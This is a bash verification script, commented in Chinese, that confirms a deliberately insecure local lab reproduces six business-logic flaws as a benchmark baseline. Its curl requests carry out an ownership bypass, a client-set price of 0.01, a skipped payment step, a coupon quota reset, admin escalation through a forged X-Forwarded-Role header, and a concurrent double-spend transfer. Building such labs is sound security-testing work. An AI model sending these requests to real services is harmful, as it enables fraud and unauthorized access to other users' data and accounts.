#!/usr/bin/env bash
# bizlogic 靶场的 ground truth 验证：六类缺陷**确实可复现**。
#
# # 这个脚本的作用
#
# 它是 `docs/04` §P2 门禁「业务逻辑首个可复现数字」的**基准定义**：
# 只有先证明"靶场里这六个洞真的存在"，后面"系统检出了几个"才有意义。
#
# 语义要读准：脚本对每个洞期望 **VULNERABLE**（靶场就是故意不安全的）。
# 若某条报 NOT-VULNERABLE，说明靶场与应用设计不符 —— 那是靶场的问题，
# 不是被测系统变强了。
#
# 用法：scripts/labs-up.sh bizlogic && bash labs/bizlogic/verify.sh
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BASE="http://127.0.0.1:8080"
GRN=$'\033[32m'; RED=$'\033[31m'; NC=$'\033[0m'

fails=0
say() { printf '  %-6s %-8s %s\n' "$1" "$2" "$3"; }
vuln() { say "$(printf '%sVULN%s' "$GRN" "$NC")" "$1" "$2"; }
safe() { say "$(printf '%sSAFE%s' "$RED" "$NC")" "$1" "$2"; fails=$((fails+1)); }

code() { timeout 8 curl -s -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }
body() { timeout 8 curl -s "$@" 2>/dev/null; }

echo "== bizlogic 靶场 ground truth（期望全部 VULN）=="

# 前置：服务在跑
if [ "$(code "$BASE/health")" != "200" ]; then
  echo "  靶场未就绪：$BASE/health 不可达。先跑 scripts/labs-up.sh bizlogic"
  exit 2
fi

# ---- BL1 越权访问：alice 读 bob 的订单 200 ----
b1=$(body -H 'X-Auth-User: alice' "$BASE/api/orders/200")
if printf '%s' "$b1" | grep -q '"owner": *"bob"'; then
  vuln BL1 "alice 成功读取 bob 的订单 200（无属主校验）"
else
  safe BL1 "alice 未能读取他人订单：$b1"
fi

# ---- BL2 价格篡改：客户端指定 total ----
b2=$(body -X POST -H 'X-Auth-User: alice' -H 'Content-Type: application/json' \
     -d '{"total":0.01}' "$BASE/api/checkout")
if printf '%s' "$b2" | grep -q '"total": *0.01'; then
  vuln BL2 "服务端接受了客户端提交的 total=0.01（未自行计价）"
else
  safe BL2 "服务端未采信客户端金额：$b2"
fi

# ---- BL3 流程绕过：CREATED 直接 SHIP ----
b3=$(body -X POST -H 'X-Auth-User: alice' -H 'Content-Type: application/json' \
     -d '{}' "$BASE/api/orders/100/ship")
if printf '%s' "$b3" | grep -q '"status": *"SHIPPED"'; then
  vuln BL3 "订单 100 从 CREATED 直接变为 SHIPPED（跳过 PAID）"
else
  safe BL3 "流程未被绕过：$b3"
fi

# ---- BL4 配额绕过：reset 后无限兑换 ----
ok4=0
for _ in 1 2 3 4; do
  r=$(code -X POST -H 'X-Auth-User: bob' -H 'Content-Type: application/json' \
       -d '{"reset":1}' "$BASE/api/coupon/redeem")
  [ "$r" = "200" ] && ok4=$((ok4+1))
done
if [ "$ok4" -ge 4 ]; then
  vuln BL4 "配额(2)被绕过：reset 后连续 4 次兑换全部成功"
else
  safe BL4 "配额生效（仅 $ok4/4 次成功）"
fi

# ---- BL5 权限提升链：伪造 X-Forwarded-Role 提权 ----
b5=$(body -X POST -H 'X-Auth-User: bob' -H 'X-Forwarded-Role: admin' \
     -H 'Content-Type: application/json' -d '{}' "$BASE/api/admin/users/2/promote")
if printf '%s' "$b5" | grep -q '"promoted": *"bob"'; then
  vuln BL5 "普通用户 bob 凭伪造头 X-Forwarded-Role 把自己提为 admin"
else
  safe BL5 "提权被拒：$b5"
fi

# ---- BL6 竞态：并发转账导致双花 ----
# bob 的余额此时可能已被 BL5 影响（不影响余额），仍以实际余额为准。
before=$(body "$BASE/api/state" | python3 -c 'import json,sys; print(json.load(sys.stdin)["users"]["bob"]["balance"])' 2>/dev/null || echo 0)
# 并发两笔 800：若检查与提交之间有窗口，两笔都会通过（余额 1000 < 1600）。
for _ in 1 2; do
  ( timeout 10 curl -s -o /dev/null -X POST -H 'X-Auth-User: bob' \
      -H 'Content-Type: application/json' -d '{"to":"alice","amount":800}' \
      "$BASE/api/transfer" ) &
done
wait
after=$(body "$BASE/api/state" | python3 -c 'import json,sys; print(json.load(sys.stdin)["users"]["bob"]["balance"])' 2>/dev/null || echo 0)
# 预期 before=1000，若双花成功则 after=1000-1600=-600
if python3 -c "import sys; sys.exit(0 if float('$after') < 0 else 1)" 2>/dev/null; then
  vuln BL6 "并发双花成功：bob 余额 $before → $after（转为负值）"
else
  safe BL6 "未发生双花：bob 余额 $before → $after"
fi

echo
if [ "$fails" -eq 0 ]; then
  echo "  结果：6/6 缺陷均可复现 —— 靶场符合设计，可作为检测基准。"
  exit 0
fi
echo "  结果：$fails 条不符合设计（靶场问题，非被测系统变强）"
exit 1
